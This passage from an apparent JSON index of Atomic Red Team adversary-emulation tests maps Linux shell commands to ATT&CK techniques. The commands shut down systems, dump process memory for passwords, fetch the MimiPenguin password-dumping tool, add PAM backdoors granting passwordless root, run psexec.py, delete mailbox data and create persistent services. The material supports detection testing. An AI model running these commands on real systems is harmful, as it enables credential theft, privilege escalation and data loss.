    "indexed_technique": "T1529.03",
    "technique_index": 3,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1529",
    "display_name": "System Shutdown/Reboot",
    "source_file": "T1529.yaml",
    "test_name": "Shutdown System via `halt` - FreeBSD/Linux",
    "test_guid": "918f70ab-e1ef-49ff-bc57-b27021df84dd",
    "description": "This test shuts down a FreeBSD/Linux system using `halt`.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "halt -p\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test shuts down a FreeBSD/Linux system using `halt`.\n",
    "indexed_technique": "T1529.04",
    "technique_index": 4,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1529",
    "display_name": "System Shutdown/Reboot",
    "source_file": "T1529.yaml",
    "test_name": "Reboot System via `halt` - FreeBSD",
    "test_guid": "7b1cee42-320f-4890-b056-d65c8b884ba5",
    "description": "This test restarts a FreeBSD system using `halt`.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "halt -r\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test restarts a FreeBSD system using `halt`.\n",
    "indexed_technique": "T1529.05",
    "technique_index": 5,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1529",
    "display_name": "System Shutdown/Reboot",
    "source_file": "T1529.yaml",
    "test_name": "Reboot System via `halt` - Linux",
    "test_guid": "78f92e14-f1e9-4446-b3e9-f1b921f2459e",
    "description": "This test restarts a Linux system using `halt`.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "halt --reboot\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test restarts a Linux system using `halt`.\n",
    "indexed_technique": "T1529.06",
    "technique_index": 6,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1529",
    "display_name": "System Shutdown/Reboot",
    "source_file": "T1529.yaml",
    "test_name": "Shutdown System via `poweroff` - FreeBSD/Linux",
    "test_guid": "73a90cd2-48a2-4ac5-8594-2af35fa909fa",
    "description": "This test shuts down a FreeBSD/Linux system using `poweroff`.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "poweroff\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test shuts down a FreeBSD/Linux system using `poweroff`.\n",
    "indexed_technique": "T1529.07",
    "technique_index": 7,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1529",
    "display_name": "System Shutdown/Reboot",
    "source_file": "T1529.yaml",
    "test_name": "Reboot System via `poweroff` - FreeBSD",
    "test_guid": "5a282e50-86ff-438d-8cef-8ae01c9e62e1",
    "description": "This test restarts a FreeBSD system using `poweroff`.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "poweroff -r 3\n",
      "name": "sh",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test restarts a FreeBSD system using `poweroff`.\n",
    "indexed_technique": "T1529.08",
    "technique_index": 8,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1529",
    "display_name": "System Shutdown/Reboot",
    "source_file": "T1529.yaml",
    "test_name": "Reboot System via `poweroff` - Linux",
    "test_guid": "61303105-ff60-427b-999e-efb90b314e41",
    "description": "This test restarts a Linux system using `poweroff`.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "poweroff --reboot\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test restarts a Linux system using `poweroff`.\n",
    "indexed_technique": "T1529.09",
    "technique_index": 9,
    "categories": [
      "impact"
    ]
  },
  {
    "attack_technique": "T1003.007",
    "display_name": "OS Credential Dumping: Proc Filesystem",
    "source_file": "T1003.007.yaml",
    "test_name": "Dump individual process memory with sh (Local)",
    "test_guid": "7e91138a-8e74-456d-a007-973d67a0bb80",
    "description": "This test identifies a process containing `T1003.007`, finds its heap memory addresses, and uses `dd` to dump the heap memory to `/tmp/T1003.007.bin`.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nHEAP_MEM=$(grep -E \"^[0-9a-f-]* r\" /proc/\"$PID\"/maps | grep heap | cut -d' ' -f 1)\nMEM_START=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f1))))\nMEM_STOP=$(echo $((0x$(echo \"$HEAP_MEM\" | cut -d\"-\" -f2))))\nMEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\ngrep -i \"PASS\" \"#{output_file}\"\n",
      "cleanup_command": "rm -f \"#{output_file}\"\n"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1003.007.bin"
      },
      "script_path": {
        "description": "Path to script generating the target process",
        "type": "path",
        "default": "/tmp/T1003.007.sh"
      },
      "pid_term": {
        "description": "Unique string to use to identify target process",
        "type": "string",
        "default": "T1003.007"
      }
    },
    "dependencies": [
      {
        "description": "Script to launch target process must exist\n",
        "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
        "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\n",
    "indexed_technique": "T1003.007.01",
    "technique_index": 1,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1003.007",
    "display_name": "OS Credential Dumping: Proc Filesystem",
    "source_file": "T1003.007.yaml",
    "test_name": "Dump individual process memory with sh on FreeBSD (Local)",
    "test_guid": "fa37b633-e097-4415-b2b8-c5bf4c86e423",
    "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nMEM_START=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f1)\nMEM_STOP=$(head -n 5 /proc/\"${PID}\"/map | tail -1 | cut -d' ' -f2)\nMEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))\ndd if=/proc/\"${PID}\"/mem of=\"#{output_file}\" ibs=1 skip=\"$MEM_START\" count=\"$MEM_SIZE\"\nstrings \"#{output_file}\" | grep -i PASS\n",
      "cleanup_command": "rm -f \"#{output_file}\"\n"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1003.007.bin"
      },
      "script_path": {
        "description": "Path to script generating the target process",
        "type": "path",
        "default": "/tmp/T1003.007.sh"
      },
      "pid_term": {
        "description": "Unique string to use to identify target process",
        "type": "string",
        "default": "T1003.007"
      }
    },
    "dependencies": [
      {
        "description": "Script to launch target process must exist\n",
        "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
        "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to\ncopy process memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n",
    "indexed_technique": "T1003.007.02",
    "technique_index": 2,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1003.007",
    "display_name": "OS Credential Dumping: Proc Filesystem",
    "source_file": "T1003.007.yaml",
    "test_name": "Dump individual process memory with Python (Local)",
    "test_guid": "437b2003-a20d-4ed8-834c-4964f24eec63",
    "description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file.\n",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "sh #{script_path}\nPID=$(pgrep -n -f \"#{pid_term}\")\nPYTHON=$(which python || which python3 || which python2)\n$PYTHON #{python_script} $PID #{output_file}\ngrep -i \"PASS\" \"#{output_file}\"\n",
      "cleanup_command": "rm -f \"#{output_file}\"\n"
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1003.007.bin"
      },
      "script_path": {
        "description": "Path to script generating the target process",
        "type": "path",
        "default": "/tmp/T1003.007.sh"
      },
      "python_script": {
        "description": "Path to script generating the target process",
        "type": "path",
        "default": "PathToAtomicsFolder/T1003.007/src/dump_heap.py"
      },
      "pid_term": {
        "description": "Unique string to use to identify target process",
        "type": "string",
        "default": "T1003.007"
      }
    },
    "dependencies": [
      {
        "description": "Script to launch target process must exist\n",
        "prereq_command": "test -f #{script_path}\ngrep \"#{pid_term}\" #{script_path}\n",
        "get_prereq_command": "echo '#!/bin/sh' > #{script_path}\necho \"sh -c 'echo \\\"The password is #{pid_term}\\\" && sleep 30' &\" >> #{script_path}\n"
      },
      {
        "description": "Requires Python\n",
        "prereq_command": "(which python || which python3 || which python2)\n",
        "get_prereq_command": "echo \"Python 2.7+ or 3.4+ must be installed\"\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Using `/proc/$PID/mem`, where $PID is the target process ID, use a Python script to\ncopy a process's heap memory to an external file so it can be searched or exfiltrated later.\nOn FreeBSD procfs must be mounted.\n",
    "indexed_technique": "T1003.007.03",
    "technique_index": 3,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1003.007",
    "display_name": "OS Credential Dumping: Proc Filesystem",
    "source_file": "T1003.007.yaml",
    "test_name": "Capture Passwords with MimiPenguin",
    "test_guid": "a27418de-bdce-4ebd-b655-38f04842bf0c",
    "description": "This test runs MimiPenguin from /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh to retrieve passwords from memory and saves output to /tmp/T1003.007Test3.txt.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "sudo #{MimiPenguin_Location} > #{output_file}\ncat #{output_file}\n",
      "cleanup_command": "rm -f #{output_file} > /dev/null\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "output_file": {
        "description": "Path where captured results will be placed",
        "type": "path",
        "default": "/tmp/T1003.007Test3.txt"
      },
      "MimiPenguin_Location": {
        "description": "Path of MimiPenguin script",
        "type": "path",
        "default": "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
      }
    },
    "dependencies": [
      {
        "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
        "prereq_command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin\n"
      },
      {
        "description": "Strings must be installed\n",
        "prereq_command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "sudo apt-get -y install binutils\n"
      },
      {
        "description": "Python2 must be installed\n",
        "prereq_command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "sudo apt-get -y install python2       \n"
      },
      {
        "description": "Libc-bin must be installed\n",
        "prereq_command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "sudo apt-get -y install libc-bin        \n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n",
    "indexed_technique": "T1003.007.04",
    "technique_index": 4,
    "categories": [
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1027.004",
    "display_name": "Obfuscated Files or Information: Compile After Delivery",
    "source_file": "T1027.004.yaml",
    "test_name": "C compile",
    "test_guid": "d0377aa6-850a-42b2-95f0-de558d80be57",
    "description": "Compile a c file (/T1027.004/src/T1027-004-test.c) with either gcc or clang.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "gcc #{input_file} && ./a.out\nclang #{input_file} && ./a.out\n",
      "name": "sh"
    },
    "input_arguments": {
      "input_file": {
        "description": "source file",
        "type": "path",
        "default": "PathToAtomicsFolder/T1027.004/src/T1027-004-test.c"
      }
    },
    "dependencies": [
      {
        "description": "the source file must exist on disk at specified location (#{input_file})\n",
        "prereq_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.c -O \"#{input_file}\"\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Compile a c file with either gcc or clang on FreeBSD, Linux or Macos.\n",
    "indexed_technique": "T1027.004.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1027.004",
    "display_name": "Obfuscated Files or Information: Compile After Delivery",
    "source_file": "T1027.004.yaml",
    "test_name": "Go compile",
    "test_guid": "78bd3fa7-773c-449e-a978-dc1f1500bc52",
    "description": "Compile a go file (/T1027.004/src/T1027-004-test.go) with golang.\n",
    "supported_platforms": [
      "linux",
      "macos"
    ],
    "executor": {
      "command": "go run #{input_file}\n",
      "name": "sh"
    },
    "input_arguments": {
      "input_file": {
        "description": "source file",
        "type": "path",
        "default": "PathToAtomicsFolder/T1027.004/src/T1027-004-test.go"
      }
    },
    "dependencies": [
      {
        "description": "the source file must exist on disk at specified location (#{input_file})\n",
        "prereq_command": "if [ -e  #{input_file} ]; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "wget https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.004/src/T1027-004-test.go -O #{input_file}\n"
      }
    ],
    "dependency_executor_name": "sh",
    "original_description": "Compile a go file with golang on FreeBSD, Linux or Macos.\n",
    "indexed_technique": "T1027.004.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1595.003",
    "display_name": "Active Scanning: Wordlist Scanning",
    "source_file": "T1595.003.yaml",
    "test_name": "Web Server Wordlist Scan",
    "test_guid": "89a83c3e-0b39-4c80-99f5-c2aa084098bd",
    "description": "This test will scan the target system (http://localhost) with a wordlist (/T1595.003/src/wordlist.txt) of common directories and file paths.\n",
    "supported_platforms": [
      "windows",
      "linux",
      "macos"
    ],
    "executor": {
      "command": "Import-Module \"PathToAtomicsFolder/T1595.003/src/WebServerScan.ps1\"\nInvoke-WordlistScan -Target \"#{target}\" -Wordlist \"#{wordlist}\" -Timeout \"#{request_timeout}\" -OutputFile \"#{output_file}\"\nWrite-Host \"Scan complete. Results saved to: #{output_file}\"\n",
      "name": "powershell"
    },
    "input_arguments": {
      "target": {
        "description": "The target system to scan",
        "type": "string",
        "default": "http://localhost"
      },
      "wordlist": {
        "description": "The wordlist to use for scanning",
        "type": "path",
        "default": "PathToAtomicsFolder/T1595.003/src/wordlist.txt"
      },
      "request_timeout": {
        "description": "The timeout for each request (in seconds)",
        "type": "integer",
        "default": 5
      },
      "output_file": {
        "description": "File to output results to",
        "type": "string",
        "default": "$env:TMPDIR/wordlist_scan.txt"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test will scan a target system with a wordlist of common directories and file paths.\n",
    "indexed_technique": "T1595.003.01",
    "technique_index": 1,
    "categories": []
  },
  {
    "attack_technique": "T1556.003",
    "display_name": "Modify Authentication Process: Pluggable Authentication Modules",
    "source_file": "T1556.003.yaml",
    "test_name": "Malicious PAM rule",
    "test_guid": "4b9dde80-ae22-44b1-a82a-644bf009eb9c",
    "description": "Inserts a rule (auth sufficient pam_succeed_if.so uid >= 0) into a PAM config (/etc/pam.d/su-l) and then tests it.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
      "cleanup_command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n"
    },
    "input_arguments": {
      "path_to_pam_conf": {
        "description": "PAM config file to modify.",
        "type": "string",
        "default": "/etc/pam.d/su-l"
      },
      "pam_rule": {
        "description": "Rule to add to the PAM config.",
        "type": "string",
        "default": "auth sufficient pam_succeed_if.so uid >= 0"
      },
      "index": {
        "description": "Index where the rule is inserted.",
        "type": "integer",
        "default": 1
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "Inserts a rule into a PAM config and then tests it.\n\nUpon successful execution, this test will insert a rule that allows every user to su to root without a password.\n",
    "indexed_technique": "T1556.003.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion",
      "persistence",
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1556.003",
    "display_name": "Modify Authentication Process: Pluggable Authentication Modules",
    "source_file": "T1556.003.yaml",
    "test_name": "Malicious PAM module",
    "test_guid": "65208808-3125-4a2e-8389-a0a00e9ab326",
    "description": "Creates a PAM module (/T1556.003/src/pam_evil.c) and inserts a rule (auth sufficient /tmp/pam_evil.so) to use it, and then tests it.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "name": "sh",
      "elevation_required": true,
      "command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}\n",
      "cleanup_command": "sudo sed -i \"\\,#{pam_rule},d\" #{path_to_pam_conf}\n"
    },
    "input_arguments": {
      "path_to_pam_conf": {
        "description": "PAM config file to modify.",
        "type": "string",
        "default": "/etc/pam.d/su-l"
      },
      "pam_rule": {
        "description": "Rule to add to the PAM config.",
        "type": "string",
        "default": "auth sufficient /tmp/pam_evil.so"
      },
      "index": {
        "description": "Index where the rule is inserted.",
        "type": "integer",
        "default": 1
      },
      "path_to_pam_module_source": {
        "description": "Path to PAM module source code.",
        "type": "path",
        "default": "PathToAtomicsFolder/T1556.003/src/pam_evil.c"
      },
      "path_to_pam_module": {
        "description": "Path to PAM module object",
        "type": "path",
        "default": "/tmp/pam_evil.so"
      }
    },
    "dependencies": [
      {
        "description": "The PAM development library must be installed to build the PAM module\n",
        "prereq_command": "if [ -f /usr/include/security/pam_modules.h ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "if [ -n \"`which apt-get`\" ]; then sudo apt-get -y install libpam0g-dev; elif [ -n \"`which yum`\" ]; then sudo yum -y install pam-devel; fi\n"
      },
      {
        "description": "The PAM module must exist on disk at specified location (#{path_to_pam_module})\n",
        "prereq_command": "if [ -f #{path_to_pam_module} ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "sudo gcc -shared -fPIC -o #{path_to_pam_module} #{path_to_pam_module_source}\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Creates a PAM module, inserts a rule to use it, and then tests it.\n\nUpon successful execution, this test will create a PAM module that allows every user to su to root without a password.\n",
    "indexed_technique": "T1556.003.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion",
      "persistence",
      "credential-access"
    ]
  },
  {
    "attack_technique": "T1135",
    "display_name": "Network Share Discovery",
    "source_file": "T1135.yaml",
    "test_name": "Network Share Discovery - linux",
    "test_guid": "875805bc-9e86-4e87-be86-3a5527315cae",
    "description": "Network Share Discovery using smbstatus.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "smbstatus --shares\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "package_checker": {
        "description": "Package checking command. Debian - dpkg -s samba",
        "type": "string",
        "default": "(rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed)"
      },
      "package_installer": {
        "description": "Package installer command. Debian - apt install samba",
        "type": "string",
        "default": "(which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba)"
      }
    },
    "dependencies": [
      {
        "description": "Package with smbstatus (samba) must exist on device\n",
        "prereq_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
        "get_prereq_command": "#{package_installer}\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Network Share Discovery using smbstatus\n",
    "indexed_technique": "T1135.01",
    "technique_index": 1,
    "categories": [
      "discovery"
    ]
  },
  {
    "attack_technique": "T1569.002",
    "display_name": "System Services: Service Execution",
    "source_file": "T1569.002.yaml",
    "test_name": "psexec.py (Impacket)",
    "test_guid": "edbcd8c9-3639-4844-afad-455c91e95a35",
    "description": "This test executes 'whoami' on 127.0.0.1 using Impacket's psexec.py with username Administrator and password P@ssw0rd1.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "psexec.py '#{domain}/#{username}:#{password}@#{remote_host}' '#{command}'\n",
      "name": "bash"
    },
    "input_arguments": {
      "remote_host": {
        "description": "Remote hostname or IP address",
        "type": "string",
        "default": "127.0.0.1"
      },
      "username": {
        "description": "Username",
        "type": "string",
        "default": "Administrator"
      },
      "domain": {
        "description": "Target domain",
        "type": "string",
        "default": ""
      },
      "password": {
        "description": "Password",
        "type": "string",
        "default": "P@ssw0rd1"
      },
      "command": {
        "description": "Command to execute in target computer",
        "type": "string",
        "default": "whoami"
      }
    },
    "dependencies": [
      {
        "description": "psexec.py (Impacket)\n",
        "prereq_command": "if [ -x \"$(command -v psexec.py)\" ]; then exit 0; else exit 1; fi;\n",
        "get_prereq_command": "sudo pip3 install impacket\n"
      }
    ],
    "dependency_executor_name": "bash",
    "original_description": "Will execute a command on the remote host with Impacket psexec.py script.\n",
    "indexed_technique": "T1569.002.01",
    "technique_index": 1,
    "categories": [
      "execution"
    ]
  },
  {
    "attack_technique": "T1070.008",
    "display_name": "Email Collection: Mailbox Manipulation",
    "source_file": "T1070.008.yaml",
    "test_name": "Copy and Delete Mailbox Data on Linux",
    "test_guid": "25e2be0e-96f7-4417-bd16-a4a2500e3802",
    "description": "Copies all mail data from /var/spool/mail to /var/spool/mail/copy and then deletes the copied data.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*\n",
      "cleanup_command": "rm -rf /var/spool/mail/copy\nif [ -f \"$(ls -A /var/spool/mail/temp)\" ]; then rm /var/spool/mail/temp; fi\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Create dummy file in /var/spool/mail/ if no files exist\n",
        "prereq_command": "if [ -z \"$(ls -A /var/spool/mail/)\" ]; then exit 1; else exit 0; fi\n",
        "get_prereq_command": "if [ -z \"$(ls -A /var/spool/mail/)\" ]; then touch /var/spool/mail/temp; fi\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Copies and deletes mail data on Linux\n",
    "indexed_technique": "T1070.008.01",
    "technique_index": 1,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1070.008",
    "display_name": "Email Collection: Mailbox Manipulation",
    "source_file": "T1070.008.yaml",
    "test_name": "Copy and Modify Mailbox Data on Linux",
    "test_guid": "6d99f93c-da56-49e3-b195-163090ace4f6",
    "description": "Copies mail data from /var/spool/mail to /var/spool/mail/copy and appends 'Modification for Atomic Red Test' to each copied file.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; if [ -f \"/var/spool/mail/copy/$(basename \"$file\")\" ]; then echo \"Modification for Atomic Red Test\" >> \"/var/spool/mail/copy/$(basename \"$file\")\"; fi; fi; done\n",
      "cleanup_command": "rm -rf /var/spool/mail/copy\nif [ -f \"$(ls -A /var/spool/mail/temp)\" ]; then rm /var/spool/mail/temp; fi\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {},
    "dependencies": [
      {
        "description": "Create dummy file in /var/spool/mail/ if no files exist\n",
        "prereq_command": "if [ -z \"$(ls -A /var/spool/mail/)\" ]; then exit 1; else exit 0; fi\n",
        "get_prereq_command": "if [ -z \"$(ls -A /var/spool/mail/)\" ]; then touch /var/spool/mail/temp; fi\n"
      }
    ],
    "dependency_executor_name": "",
    "original_description": "Copies and modifies mail data on Linux\n",
    "indexed_technique": "T1070.008.02",
    "technique_index": 2,
    "categories": [
      "defense-evasion"
    ]
  },
  {
    "attack_technique": "T1543.002",
    "display_name": "Create or Modify System Process: SysV/Systemd Service",
    "source_file": "T1543.002.yaml",
    "test_name": "Create Systemd Service",
    "test_guid": "d9e4f24f-aa67-4c6e-bcbf-85622b697a7c",
    "description": "This test creates a Systemd service unit file (/etc/systemd/system/art-systemd-service.service) and enables it as a service.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
      "command": "echo \"[Unit]\" > #{systemd_service_path}/#{systemd_service_file}\necho \"Description=Atomic Red Team Systemd Service\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Service]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"Type=simple\"\necho \"ExecStart=#{execstart_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPre=#{execstartpre_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStartPost=#{execstartpost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecReload=#{execreload_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStop=#{execstop_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"ExecStopPost=#{execstoppost_action}\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"[Install]\" >> #{systemd_service_path}/#{systemd_service_file}\necho \"WantedBy=default.target\" >> #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\nsystemctl enable #{systemd_service_file}\nsystemctl start #{systemd_service_file}\n",
      "cleanup_command": "systemctl stop #{systemd_service_file}\nsystemctl disable #{systemd_service_file}\nrm -rf #{systemd_service_path}/#{systemd_service_file}\nsystemctl daemon-reload\n",
      "name": "bash",
      "elevation_required": true
    },
    "input_arguments": {
      "systemd_service_path": {
        "description": "Path to systemd service unit file",
        "type": "path",
        "default": "/etc/systemd/system"
      },
      "systemd_service_file": {
        "description": "File name of systemd service unit file",
        "type": "string",
        "default": "art-systemd-service.service"
      },
      "execstoppost_action": {
        "description": "ExecStopPost action for Systemd service",
        "type": "string",
        "default": "/bin/touch /tmp/art-systemd-execstoppost-marker"
      },
      "execreload_action": {
        "description": "ExecReload action for Systemd service",
        "type": "string",
        "default": "/bin/touch /tmp/art-systemd-execreload-marker"
      },
      "execstart_action": {
        "description": "ExecStart action for Systemd service",
        "type": "string",
        "default": "/bin/touch /tmp/art-systemd-execstart-marker"
      },
      "execstop_action": {
        "description": "ExecStop action for Systemd service",
        "type": "string",
        "default": "/bin/touch /tmp/art-systemd-execstop-marker"
      },
      "execstartpre_action": {
        "description": "ExecStartPre action for Systemd service",
        "type": "string",
        "default": "/bin/touch /tmp/art-systemd-execstartpre-marker"
      },
      "execstartpost_action": {
        "description": "ExecStartPost action for Systemd service",
        "type": "string",
        "default": "/bin/touch /tmp/art-systemd-execstartpost-marker"
      }
    },
    "dependencies": [],
    "dependency_executor_name": "",
    "original_description": "This test creates a Systemd service unit file and enables it as a service.\n",
    "indexed_technique": "T1543.002.01",
    "technique_index": 1,
    "categories": [
      "privilege-escalation",
      "persistence"
    ]
  },
  {
    "attack_technique": "T1543.002",
    "display_name": "Create or Modify System Process: SysV/Systemd Service",
    "source_file": "T1543.002.yaml",
    "test_name": "Create SysV Service",
    "test_guid": "760fe8d2-79d9-494f-905e-a239a3df86f6",
    "description": "This test creates a SysV service unit file (/usr/local/etc/rc.d/art-test) and enables it as a service.",
    "supported_platforms": [
      "linux"
    ],
    "executor": {
